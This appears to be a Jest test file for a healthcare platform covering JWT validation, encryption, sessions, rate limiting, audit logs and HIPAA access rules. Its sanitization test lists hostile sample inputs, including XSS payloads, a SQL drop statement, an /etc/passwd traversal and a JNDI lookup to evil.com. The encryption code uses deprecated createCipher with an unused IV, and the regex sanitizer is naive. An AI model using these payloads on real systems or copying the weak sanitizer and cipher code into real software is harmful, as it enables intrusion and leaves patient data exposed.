/**
 * Comprehensive Security and Authentication Integration Tests
 * 
 * Tests JWT authentication, encryption, session management, and security compliance
 * for the WebQx healthcare platform.
 */

import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import { createTestEnvironment, cleanupTestEnvironment, testConfig } from '../setup/test-environment';
import MockServiceManager from '../mocks/services';

describe('Security and Authentication Integration Tests', () => {
  let mockServices: MockServiceManager;

  beforeAll(async () => {
    createTestEnvironment();
    mockServices = new MockServiceManager();
  });

  afterAll(async () => {
    mockServices.cleanupAllMocks();
    cleanupTestEnvironment();
  });

  describe('JWT Authentication', () => {
    test('Should generate valid JWT tokens with proper claims', () => {
      const payload = {
        sub: 'patient-123',
        iss: 'webqx-healthcare',
        aud: 'webqx-api',
        scope: 'patient/*.read patient/*.write',
        patient_id: 'patient-123',
        provider_id: 'provider-456',
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 3600
      };

      const token = jwt.sign(payload, testConfig.security.jwtSecret);
      expect(token).toBeDefined();
      expect(typeof token).toBe('string');

      // Verify token can be decoded
      const decoded = jwt.verify(token, testConfig.security.jwtSecret) as any;
      expect(decoded.sub).toBe(payload.sub);
      expect(decoded.iss).toBe(payload.iss);
      expect(decoded.aud).toBe(payload.aud);
      expect(decoded.scope).toBe(payload.scope);
    });

    test('Should reject tokens with invalid signatures', () => {
      const payload = { sub: 'patient-123', scope: 'patient/*.read' };
      const token = jwt.sign(payload, 'wrong-secret');

      expect(() => {
        jwt.verify(token, testConfig.security.jwtSecret);
      }).toThrow('invalid signature');
    });

    test('Should reject expired tokens', () => {
      const payload = {
        sub: 'patient-123',
        scope: 'patient/*.read',
        exp: Math.floor(Date.now() / 1000) - 3600 // Expired 1 hour ago
      };
      const token = jwt.sign(payload, testConfig.security.jwtSecret);

      expect(() => {
        jwt.verify(token, testConfig.security.jwtSecret);
      }).toThrow('jwt expired');
    });

    test('Should validate token structure and required claims', () => {
      const validToken = jwt.sign({
        sub: 'patient-123',
        iss: 'webqx-healthcare',
        aud: 'webqx-api',
        scope: 'patient/*.read',
        exp: Math.floor(Date.now() / 1000) + 3600
      }, testConfig.security.jwtSecret);

      const decoded = jwt.verify(validToken, testConfig.security.jwtSecret) as any;
      
      // Check required claims
      expect(decoded).toHaveProperty('sub');
      expect(decoded).toHaveProperty('iss');
      expect(decoded).toHaveProperty('aud');
      expect(decoded).toHaveProperty('scope');
      expect(decoded).toHaveProperty('exp');
    });

    test('Should handle different scope combinations', () => {
      const scopes = [
        'patient/*.read',
        'patient/*.write',
        'user/*.read',
        'user/*.write',
        'system/*.read'
      ];

      scopes.forEach(scope => {
        const token = jwt.sign({
          sub: 'test-user',
          scope,
          exp: Math.floor(Date.now() / 1000) + 3600
        }, testConfig.security.jwtSecret);

        const decoded = jwt.verify(token, testConfig.security.jwtSecret) as any;
        expect(decoded.scope).toBe(scope);
      });
    });

    test('Should generate tokens with proper HIPAA compliance claims', () => {
      const hipaaToken = jwt.sign({
        sub: 'provider-123',
        iss: 'webqx-healthcare',
        aud: 'webqx-api',
        scope: 'patient/*.read patient/*.write',
        purpose_of_use: 'TREATMENT',
        user_role: 'physician',
        organization: 'Acme Healthcare',
        audit_id: crypto.randomUUID(),
        exp: Math.floor(Date.now() / 1000) + 3600
      }, testConfig.security.jwtSecret);

      const decoded = jwt.verify(hipaaToken, testConfig.security.jwtSecret) as any;
      expect(decoded).toHaveProperty('purpose_of_use', 'TREATMENT');
      expect(decoded).toHaveProperty('user_role', 'physician');
      expect(decoded).toHaveProperty('organization');
      expect(decoded).toHaveProperty('audit_id');
    });
  });

  describe('Encryption and Data Protection', () => {
    test('Should encrypt and decrypt sensitive data correctly', () => {
      const sensitiveData = 'SSN: 123-45-6789';
      const encryptionKey = testConfig.security.encryptionKey;
      
      // Encrypt data
      const algorithm = 'aes-256-gcm';
      const iv = crypto.randomBytes(16);
      const cipher = crypto.createCipher(algorithm, encryptionKey);
      
      let encrypted = cipher.update(sensitiveData, 'utf8', 'hex');
      encrypted += cipher.final('hex');
      
      expect(encrypted).not.toBe(sensitiveData);
      expect(encrypted.length).toBeGreaterThan(0);

      // Decrypt data
      const decipher = crypto.createDecipher(algorithm, encryptionKey);
      let decrypted = decipher.update(encrypted, 'hex', 'utf8');
      decrypted += decipher.final('utf8');
      
      expect(decrypted).toBe(sensitiveData);
    });

    test('Should hash passwords securely', () => {
      const password = 'secure_password_123';
      const salt = crypto.randomBytes(16).toString('hex');
      
      // Create hash using PBKDF2
      const hash = crypto.pbkdf2Sync(password, salt, 10000, 64, 'sha512').toString('hex');
      
      expect(hash).toBeDefined();
      expect(hash.length).toBe(128); // 64 bytes * 2 (hex encoding)
      expect(hash).not.toContain(password);
      
      // Verify the same password produces the same hash with same salt
      const hash2 = crypto.pbkdf2Sync(password, salt, 10000, 64, 'sha512').toString('hex');
      expect(hash).toBe(hash2);
      
      // Verify different password produces different hash
      const differentHash = crypto.pbkdf2Sync('different_password', salt, 10000, 64, 'sha512').toString('hex');
      expect(hash).not.toBe(differentHash);
    });

    test('Should generate secure random tokens', () => {
      const token1 = crypto.randomBytes(32).toString('hex');
      const token2 = crypto.randomBytes(32).toString('hex');
      
      expect(token1).not.toBe(token2);
      expect(token1.length).toBe(64); // 32 bytes * 2 (hex encoding)
      expect(token2.length).toBe(64);
      
      // Should contain only hex characters
      expect(/^[a-f0-9]+$/i.test(token1)).toBe(true);
      expect(/^[a-f0-9]+$/i.test(token2)).toBe(true);
    });

    test('Should encrypt PHI (Protected Health Information) data', () => {
      const phi = {
        ssn: '123-45-6789',
        dateOfBirth: '1990-01-01',
        medicalRecordNumber: 'MRN123456',
        diagnosis: 'Hypertension'
      };

      const encryptionKey = crypto.scryptSync(testConfig.security.encryptionKey, 'salt', 32);
      const algorithm = 'aes-256-gcm';
      
      Object.entries(phi).forEach(([key, value]) => {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipher(algorithm, encryptionKey);
        
        let encrypted = cipher.update(value, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        
        expect(encrypted).not.toBe(value);
        expect(encrypted).not.toContain(value);
      });
    });
  });

  describe('Session Management', () => {
    test('Should generate secure session IDs', () => {
      const sessionId1 = crypto.randomUUID();
      const sessionId2 = crypto.randomUUID();
      
      expect(sessionId1).not.toBe(sessionId2);
      expect(sessionId1).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i);
      expect(sessionId2).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i);
    });

    test('Should handle session data securely', () => {
      const sessionSecret = testConfig.security.sessionSecret;
      const sessionData = {
        userId: 'user-123',
        patientId: 'patient-456',
        roles: ['physician'],
        lastActivity: new Date().toISOString()
      };

      // Sign session data
      const sessionString = JSON.stringify(sessionData);
      const signature = crypto
        .createHmac('sha256', sessionSecret)
        .update(sessionString)
        .digest('hex');

      // Verify session integrity
      const verifySignature = crypto
        .createHmac('sha256', sessionSecret)
        .update(sessionString)
        .digest('hex');

      expect(signature).toBe(verifySignature);
      
      // Ensure tampered data fails verification
      const tamperedData = sessionString.replace('user-123', 'user-999');
      const tamperedSignature = crypto
        .createHmac('sha256', sessionSecret)
        .update(tamperedData)
        .digest('hex');

      expect(signature).not.toBe(tamperedSignature);
    });

    test('Should implement session timeout', () => {
      const sessionTimeout = 30 * 60 * 1000; // 30 minutes
      const now = Date.now();
      
      const activeSession = {
        id: crypto.randomUUID(),
        userId: 'user-123',
        createdAt: now,
        lastActivity: now,
        expiresAt: now + sessionTimeout
      };

      const expiredSession = {
        id: crypto.randomUUID(),
        userId: 'user-456',
        createdAt: now - sessionTimeout - 1000,
        lastActivity: now - sessionTimeout - 1000,
        expiresAt: now - 1000
      };

      expect(activeSession.expiresAt > now).toBe(true);
      expect(expiredSession.expiresAt < now).toBe(true);
    });
  });

  describe('Rate Limiting and Abuse Prevention', () => {
    test('Should implement proper rate limiting structure', () => {
      const rateLimitConfig = {
        windowMs: 15 * 60 * 1000, // 15 minutes
        max: 100, // Limit each IP to 100 requests per windowMs
        message: 'Too many requests from this IP, please try again later.',
        standardHeaders: true,
        legacyHeaders: false,
      };

      expect(rateLimitConfig.windowMs).toBe(15 * 60 * 1000);
      expect(rateLimitConfig.max).toBe(100);
      expect(rateLimitConfig.message).toBeDefined();
    });

    test('Should track request counts per IP', () => {
      const requestTracker = new Map<string, { count: number; resetTime: number }>();
      const windowMs = 15 * 60 * 1000;
      const maxRequests = 100;
      const now = Date.now();

      const ip = '192.168.1.100';
      const existing = requestTracker.get(ip);

      if (!existing || now > existing.resetTime) {
        requestTracker.set(ip, {
          count: 1,
          resetTime: now + windowMs
        });
      } else {
        existing.count++;
      }

      const tracker = requestTracker.get(ip)!;
      expect(tracker.count).toBe(1);
      expect(tracker.resetTime).toBeGreaterThan(now);
      
      // Simulate multiple requests
      for (let i = 0; i < 50; i++) {
        tracker.count++;
      }
      
      expect(tracker.count).toBe(51);
      expect(tracker.count < maxRequests).toBe(true);
    });
  });

  describe('Input Validation and Sanitization', () => {
    test('Should validate and sanitize user input', () => {
      const unsafeInputs = [
        '<script>alert("xss")</script>',
        'DROP TABLE users;',
        '../../etc/passwd',
        'javascript:alert(1)',
        '${jndi:ldap://evil.com/a}',
        '<img src=x onerror=alert(1)>'
      ];

      const sanitizeInput = (input: string): string => {
        return input
          .replace(/[<>\"'&]/g, '') // Remove dangerous characters
          .replace(/script/gi, '') // Remove script tags
          .replace(/javascript:/gi, '') // Remove javascript: protocol
          .replace(/on\w+=/gi, '') // Remove event handlers
          .trim();
      };

      unsafeInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized.toLowerCase()).not.toContain('onerror');
      });
    });

    test('Should validate FHIR resource input', () => {
      const validatePatientResource = (patient: any): { valid: boolean; errors: string[] } => {
        const errors: string[] = [];

        if (!patient.resourceType || patient.resourceType !== 'Patient') {
          errors.push('Invalid or missing resourceType');
        }

        if (!patient.name || !Array.isArray(patient.name) || patient.name.length === 0) {
          errors.push('Patient must have at least one name');
        }

        if (patient.gender && !['male', 'female', 'other', 'unknown'].includes(patient.gender)) {
          errors.push('Invalid gender value');
        }

        if (patient.birthDate && !/^\d{4}-\d{2}-\d{2}$/.test(patient.birthDate)) {
          errors.push('Invalid birth date format');
        }

        return {
          valid: errors.length === 0,
          errors
        };
      };

      const validPatient = {
        resourceType: 'Patient',
        name: [{ family: 'Doe', given: ['John'] }],
        gender: 'male',
        birthDate: '1990-01-01'
      };

      const invalidPatient = {
        resourceType: 'InvalidType',
        name: null,
        gender: 'invalid',
        birthDate: 'not-a-date'
      };

      const validResult = validatePatientResource(validPatient);
      expect(validResult.valid).toBe(true);
      expect(validResult.errors).toHaveLength(0);

      const invalidResult = validatePatientResource(invalidPatient);
      expect(invalidResult.valid).toBe(false);
      expect(invalidResult.errors.length).toBeGreaterThan(0);
    });
  });

  describe('Audit Logging for Security Events', () => {
    test('Should log authentication events', () => {
      const auditLog: any[] = [];

      const logAuthEvent = (event: {
        type: 'login' | 'logout' | 'failed_login' | 'token_refresh';
        userId?: string;
        ip: string;
        userAgent: string;
        timestamp: string;
        success: boolean;
        details?: any;
      }) => {
        auditLog.push({
          ...event,
          id: crypto.randomUUID(),
          source: 'webqx-auth-service'
        });
      };

      // Log successful login
      logAuthEvent({
        type: 'login',
        userId: 'user-123',
        ip: '192.168.1.100',
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        timestamp: new Date().toISOString(),
        success: true
      });

      // Log failed login
      logAuthEvent({
        type: 'failed_login',
        ip: '192.168.1.100',
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        timestamp: new Date().toISOString(),
        success: false,
        details: { reason: 'invalid_credentials' }
      });

      expect(auditLog).toHaveLength(2);
      expect(auditLog[0]).toHaveProperty('type', 'login');
      expect(auditLog[0]).toHaveProperty('success', true);
      expect(auditLog[1]).toHaveProperty('type', 'failed_login');
      expect(auditLog[1]).toHaveProperty('success', false);
    });

    test('Should log data access events', () => {
      const dataAccessLog: any[] = [];

      const logDataAccess = (event: {
        userId: string;
        patientId: string;
        resourceType: string;
        action: 'read' | 'write' | 'delete';
        ip: string;
        timestamp: string;
        authorized: boolean;
      }) => {
        dataAccessLog.push({
          ...event,
          id: crypto.randomUUID(),
          source: 'webqx-fhir-service'
        });
      };

      logDataAccess({
        userId: 'provider-123',
        patientId: 'patient-456',
        resourceType: 'Patient',
        action: 'read',
        ip: '192.168.1.100',
        timestamp: new Date().toISOString(),
        authorized: true
      });

      logDataAccess({
        userId: 'unauthorized-user',
        patientId: 'patient-456',
        resourceType: 'Patient',
        action: 'read',
        ip: '192.168.1.101',
        timestamp: new Date().toISOString(),
        authorized: false
      });

      expect(dataAccessLog).toHaveLength(2);
      expect(dataAccessLog[0]).toHaveProperty('authorized', true);
      expect(dataAccessLog[1]).toHaveProperty('authorized', false);
    });
  });

  describe('Security Headers and Policies', () => {
    test('Should implement proper Content Security Policy', () => {
      const csp = {
        'default-src': ["'self'"],
        'script-src': ["'self'", "'unsafe-inline'", 'https://cdn.webqx.health'],
        'style-src': ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
        'font-src': ["'self'", 'https://fonts.gstatic.com'],
        'img-src': ["'self'", 'data:', 'https:'],
        'connect-src': ["'self'", 'https://api.webqx.health'],
        'frame-ancestors': ["'none'"],
        'base-uri': ["'self'"],
        'form-action': ["'self'"]
      };

      expect(csp['default-src']).toEqual(["'self'"]);
      expect(csp['frame-ancestors']).toEqual(["'none'"]);
      expect(csp['base-uri']).toEqual(["'self'"]);
    });

    test('Should validate security header configuration', () => {
      const securityHeaders = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
      };

      expect(securityHeaders['X-Content-Type-Options']).toBe('nosniff');
      expect(securityHeaders['X-Frame-Options']).toBe('DENY');
      expect(securityHeaders['Strict-Transport-Security']).toContain('max-age=31536000');
      expect(securityHeaders['Referrer-Policy']).toBe('strict-origin-when-cross-origin');
    });
  });

  describe('HIPAA Compliance Security Measures', () => {
    test('Should implement access controls for PHI', () => {
      const accessControl = {
        checkAccess: (userId: string, patientId: string, action: string): boolean => {
          // Mock access control logic
          const userRoles = new Map([
            ['provider-123', ['physician']],
            ['nurse-456', ['nurse']],
            ['admin-789', ['admin']],
            ['patient-001', ['patient']]
          ]);

          const role = userRoles.get(userId)?.[0];
          
          switch (role) {
            case 'physician':
            case 'admin':
              return true; // Full access
            case 'nurse':
              return action === 'read'; // Read-only access
            case 'patient':
              return userId === patientId; // Only own data
            default:
              return false; // No access
          }
        }
      };

      expect(accessControl.checkAccess('provider-123', 'patient-001', 'read')).toBe(true);
      expect(accessControl.checkAccess('provider-123', 'patient-001', 'write')).toBe(true);
      expect(accessControl.checkAccess('nurse-456', 'patient-001', 'read')).toBe(true);
      expect(accessControl.checkAccess('nurse-456', 'patient-001', 'write')).toBe(false);
      expect(accessControl.checkAccess('patient-001', 'patient-001', 'read')).toBe(true);
      expect(accessControl.checkAccess('patient-001', 'patient-002', 'read')).toBe(false);
      expect(accessControl.checkAccess('unauthorized', 'patient-001', 'read')).toBe(false);
    });

    test('Should implement data retention policies', () => {
      const retentionPolicy = {
        auditLogs: 7 * 365 * 24 * 60 * 60 * 1000, // 7 years in milliseconds
        sessionData: 30 * 60 * 1000, // 30 minutes
        tempFiles: 24 * 60 * 60 * 1000, // 24 hours
        patientRecords: -1 // Indefinite retention
      };

      const now = Date.now();
      
      expect(retentionPolicy.auditLogs).toBe(7 * 365 * 24 * 60 * 60 * 1000);
      expect(retentionPolicy.sessionData).toBe(30 * 60 * 1000);
      expect(retentionPolicy.patientRecords).toBe(-1);

      // Test if data should be retained
      const auditLogAge = 6 * 365 * 24 * 60 * 60 * 1000; // 6 years old
      const shouldRetainAuditLog = auditLogAge < retentionPolicy.auditLogs;
      expect(shouldRetainAuditLog).toBe(true);

      const sessionAge = 45 * 60 * 1000; // 45 minutes old
      const shouldRetainSession = sessionAge < retentionPolicy.sessionData;
      expect(shouldRetainSession).toBe(false);
    });
  });
});